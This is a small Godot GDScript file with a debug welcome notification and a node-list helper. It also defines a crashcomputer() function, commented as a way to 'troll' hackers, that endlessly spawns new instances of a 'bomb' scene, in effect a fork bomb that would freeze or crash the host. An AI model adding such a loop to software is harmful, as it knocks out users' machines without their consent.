extends Node

var activenoti = []

func _ready():
	if OS.is_debug_build():	
		Notification.send("Welcome", "Welcome to the debug build", "chroma")

func crashcomputer(): #this can be used to troll hacker or something
	while true:
		OS.create_instance(PackedStringArray(["res://internal/globalvar/bomb/bomb.tscn"]))

func names(nodes):
	var names = []
	for node in nodes:
		names.append(node)
	return names
